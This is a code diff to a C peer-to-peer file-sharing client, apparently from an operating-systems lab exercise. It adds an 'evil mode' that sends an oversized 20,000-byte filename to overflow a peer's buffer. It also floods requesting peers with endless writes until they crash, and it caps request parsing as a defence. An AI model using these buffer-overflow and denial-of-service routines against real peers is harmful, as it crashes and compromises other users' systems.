@@ -527,7 +527,17 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+
+	//EXERCISE 3:
+	if(evil_mode)
+	{
+		char exploit_buffer[20000] = {'f','i','l','e','n','a','m','e','b','u','f','f','e','r','e','x','p','l','o','i','t','!'};
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", exploit_buffer);
+	}
+	else 
+	{
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	}
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -645,7 +655,13 @@ static void task_upload(task_t *t)
 	}
 
 	assert(t->head == 0);
-	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
+	/*
+	if(t->tail > FILENAMESIZ)
+	{
+		error("* Requested filename length too long\n");
+		goto exit;
+	}*/
+	if (osp2p_snscanf(t->buf, FILENAMESIZ-1, "GET %s OSP2P\n", t->filename) < 0) {
 		error("* Odd request %.*s\n", t->tail, t->buf);
 		goto exit;
 	}
@@ -658,21 +674,41 @@ static void task_upload(task_t *t)
 	}
 
 	message("* Transferring file %s\n", t->filename);
-	// Now, read file from disk and write it to the requesting peer.
-	while (1) {
-		int ret = write_from_taskbuf(t->peer_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Peer write error");
-			goto exit;
-		}
+	//EXERCISE 3:
+	if(evil_mode)
+	{
+		//infinite while loop that constantly writes
+		//the same block to the peeor over and over until the peer crashes
+		while(1)
+		{
 
-		ret = read_to_taskbuf(t->disk_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Disk read error");
-			goto exit;
-		} else if (ret == TBUF_END && t->head == t->tail)
-			/* End of file */
-			break;
+			int ret= write_from_taskbuf(t->peer_fd, t);
+			if(ret==TBUF_ERROR)
+			{
+				error("* Peer write error");
+				exit(0);
+			}
+		}
+		goto exit;
+	}
+	else	
+	{
+		// Now, read file from disk and write it to the requesting peer.
+		while (1) {
+			int ret = write_from_taskbuf(t->peer_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Peer write error");
+				goto exit;
+			}
+
+			ret = read_to_taskbuf(t->disk_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Disk read error");
+				goto exit;
+			} else if (ret == TBUF_END && t->head == t->tail)
+				/* End of file */
+				break;
+		}
 	}
 
 	message("* Upload of %s complete\n", t->filename);
